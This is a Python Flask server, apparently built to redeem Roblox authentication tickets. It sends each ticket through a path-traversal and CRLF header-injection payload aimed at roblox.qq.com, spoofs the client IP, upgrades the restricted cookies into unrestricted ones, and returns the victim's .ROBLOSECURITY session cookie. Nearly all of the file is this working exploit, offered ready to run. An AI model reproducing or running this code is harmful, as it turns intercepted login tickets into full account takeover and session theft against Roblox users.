from flask import Flask, request
from urllib.parse import quote
import re
import json
import requests

PORT = 9000
AUTH_HEADER = "X-Api-Key"
AUTH_KEY = "HELLOWORLD69"
DEFAULT_USER_AGENT = requests.get("https://jnrbsn.github.io/user-agents/user-agents.json").json()[0]
REAL_IP = requests.get("https://api.ipify.org/?format=json").json()["ip"]

app = Flask("RedeemAPI")

class RobloxError(Exception):
    pass

def qq_cookies_from_ticket(ticket, ip_addr, user_agent):
    payload = json.dumps({"authenticationTicket": ticket}, separators=(",", ":"))
    resp = requests.post(
        url="https://www.roblox.qq.com/account/signupredir/..%252f..%252f"
           f"v1%252fauthentication-ticket%252fredeem%20HTTP/1.1%0aHost:auth.roblox.com%0aUser-Agent:{quote(user_agent)}%0aRoblox-CNP-True-IP:{quote(ip_addr)}%0aContent-Type:application/json%0aRBXAuthenticationNegotiation:1%0aContent-Length:{len(payload)}%0a%0a{quote(payload)}",
        timeout=30
    )
    data = resp.json()
    for err in data.get("errors", []):
        raise RobloxError(f"{err['message']} ({err['code']})")
    return dict(resp.cookies)

def ticket_from_qq_cookies(cookies, ip_addr, user_agent):
    csrf_token = ""
    for _ in range(2):
        resp = requests.post(
            url="https://www.roblox.qq.com/account/signupredir/..%252f..%252f"
            f"v1%252fauthentication-ticket%20HTTP/1.1%0aHost:auth.roblox.com%0aUser-Agent:{quote(user_agent)}%0aCookie:{quote('; '.join('='.join(v) for v in cookies.items()))}%0aReferer:x%0aOrigin:x%0aRoblox-CNP-True-IP:{quote(ip_addr)}%0aX-CSRF-TOKEN:{quote(csrf_token)}%0aContent-Type:application/json%0aRBXAuthenticationNegotiation:1%0aContent-Length:2%0a%0a{{}}",
            timeout=30
        )
        if "x-csrf-token" in resp.headers:
            csrf_token = resp.headers["x-csrf-token"]
        else:
            break
    data = resp.json()
    for err in data.get("errors", []):
        raise RobloxError(f"{err['message']} ({err['code']})")
    return resp.headers["rbx-authentication-ticket"]

def cookies_from_ticket(ticket, user_agent):
    resp = requests.post(
        url="https://auth.roblox.com/v1/authentication-ticket/redeem",
        headers={
            "User-Agent": user_agent,
            "RBXAuthenticationNegotiation": "1"
        },
        json={"authenticationTicket": ticket}
    )
    data = resp.json()
    for err in data.get("errors", []):
        raise RobloxError(f"{err['message']} ({err['code']})")
    return dict(resp.cookies)

@app.route("/redeem", methods=["GET", "POST"])
def redeem():
    print(request.headers, request.values)
    if AUTH_KEY and request.headers.get(AUTH_HEADER) != AUTH_KEY:
        return {
            "success": False,
            "error": "AUTH_KEY is set and key provided is invalid"
            }

    ticket = request.values.get('ticket')
    ip_addr = request.values.get('ip') or request.remote_addr
    user_agent = request.values.get("userAgent", DEFAULT_USER_AGENT)

    if not isinstance(ticket, str) \
            or not re.search("^[A-F0-9]{100,1500}$", ticket):
        return {"success": False, "error": "Invalid ticket format"}
    
    try:
        # qq-only cookies
        qq_cookies = qq_cookies_from_ticket(ticket, ip_addr, user_agent)
        # unrestricted ticket from qq cookies
        qq_ticket = ticket_from_qq_cookies(qq_cookies, REAL_IP, user_agent)
        # unrestricted cookies from qq ticket
        cookies = cookies_from_ticket(qq_ticket, user_agent)
    except RobloxError as err:
        return {"success": False, "error": f"Roblox error: {err}"}
    except Exception as err:
        return {"success": False, "error": f"Internal error: {err!r}"}

    return {
        "success": True,
        "cookie": cookies[".ROBLOSECURITY"],
        "cookies": cookies
        }

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
